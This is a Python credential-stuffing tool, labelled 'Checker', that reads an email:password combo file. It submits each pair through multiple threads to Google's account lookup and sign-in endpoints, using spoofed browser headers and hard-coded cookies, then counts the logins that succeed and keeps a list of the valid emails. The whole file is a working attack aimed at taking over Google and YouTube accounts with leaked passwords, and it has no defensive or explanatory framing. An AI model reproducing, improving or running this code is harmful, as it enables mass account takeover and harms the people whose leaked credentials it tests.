import requests
import json
import threading
import os
import glob

SUCCESS_LOGIN = 0
FAILED_LOGIN = 0
Threadtimeout = 60
ThreadPoolSize = 3
ValidEmails = []
storeThreads = []

def threadManager(function, Funcargs, Startthreshold, Threadtimeout=5):
    if len(storeThreads) != Startthreshold:
        storeThreads.append(threading.Thread(target=function, args=tuple(Funcargs)))
    if len(storeThreads) == Startthreshold:
        for metaThread in storeThreads:
            metaThread.start()
        for metaThread in storeThreads:
            metaThread.join(Threadtimeout)
        storeThreads.clear()

def G_identifier(email, SessionManager):
    while True:
        try:
            params = (('hl', 'en'), ('_reqid', '60794'), ('rt', 'j'))
            headers = {
                'x-same-domain': '1',
                'origin': 'https://accounts.google.com',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
                'google-accounts-xsrf': '1',
                'cookie': 'GAPS=1:5anptsFCcX86o8zx79JaMKbjR6SUSg:i9ZZi85-G8eD7wsC; ',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'accept': '*/*',
                'referer': 'https://accounts.google.com/signin/v2/identifier',
                'authority': 'accounts.google.com',
                'dnt': '1'
            }
            data = [
                ('continue', 'https://www.youtube.com/signin?hl=en&app=desktop&next=%2F&action_handle_signin=true'),
                ('service', 'youtube'),
                ('hl', 'en'),
                ('f.req', f'["{email}","",[],null,"EG",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin",null,[],4,[],"GlifWebSignIn"],1,[null,null,[]],null,null,null,true],"{email}"]'),
                ('cookiesDisabled', 'false'),
            ]
            response = SessionManager.post('https://accounts.google.com/_/signin/sl/lookup', headers=headers, params=params, data=data)
            return json.loads(response.content.decode().replace(")]}'", ""))[0][0][2]
        except:
            pass

def login(identifier, password, SessionManager):
    while True:
        try:
            params = (('hl', 'en'), ('_reqid', '260794'), ('rt', 'j'))
            headers = {
                'x-same-domain': '1',
                'origin': 'https://accounts.google.com',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
                'google-accounts-xsrf': '1',
                'cookie': 'GAPS=1:Q6gx2sQ34TRRxWUO3mC1_Be79xLYpA:akZ-LyOsSbAsOKOQ',
                'user-agent': 'Mozilla/5.0',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'accept': '*/*',
                'referer': 'https://accounts.google.com/signin/v2/sl/pwd',
                'authority': 'accounts.google.com',
                'dnt': '1',
            }
            data = [
                ('continue', 'https://www.youtube.com/signin?hl=en&app=desktop&next=%2F&action_handle_signin=true'),
                ('service', 'youtube'),
                ('hl', 'en'),
                ('f.req', f'["{identifier}",null,1,null,[1,null,null,null,["{password}",null,true]]]'),
            ]
            response = SessionManager.post('https://accounts.google.com/_/signin/sl/challenge', headers=headers, params=params, data=data)
            login = json.loads(response.content.decode().replace(")]}'", ""))
            if "CheckCookie" in response.text:
                return 1
            if str(login[0][0][5][5]) == "INCORRECT_ANSWER_ENTERED":
                return 0
            return 1
        except:
            pass

def show_status(action):
    os.system("cls")
    banner = """
    >>> ===================================================== <<<
    >>>                   [Checker]                            <<<
    >>> ===================================================== <<<
    """
    print(banner)
    if action != "START":
        print(f"[+] Successful Logins = {SUCCESS_LOGIN}")
        print(f"[!] Failed Logins     = {FAILED_LOGIN}")

def main(email, password):
    global FAILED_LOGIN, SUCCESS_LOGIN
    SessionManager = requests.Session()
    identifier = G_identifier(email, SessionManager)
    logged = login(identifier, password, SessionManager)
    if logged:
        SUCCESS_LOGIN += 1
        ValidEmails.append(email)
    else:
        FAILED_LOGIN += 1

try:
    show_status("START")
    ThreadPoolSize_custom = input(f"[*] Choose number of threads [default = {ThreadPoolSize}]: ")
    if ThreadPoolSize_custom:
        ThreadPoolSize = int(ThreadPoolSize_custom)

    os.chdir(".")
    for file in glob.glob("*.txt"):
        print(" |_--> " + file)

    while True:
        combo_file = input("[*] Enter the name of your [Email:Password] Combo file: ")
        try:
            with open(combo_file, "r") as file:
                read_combo = file.read()
            break
        except:
            print("[!] Invalid file name!")

    input("[+] All Done! Press Enter to start...")

    for data in read_combo.split("\n"):
        parts = data.split(":")
        if len(parts) < 2:
            continue
        email, password = parts[0], parts[1]
        threadManager(main, [email, password], ThreadPoolSize, Threadtimeout)
        show_status("")
except Exception as e:
    print(f"[!!!] Fatal Error: {e}")
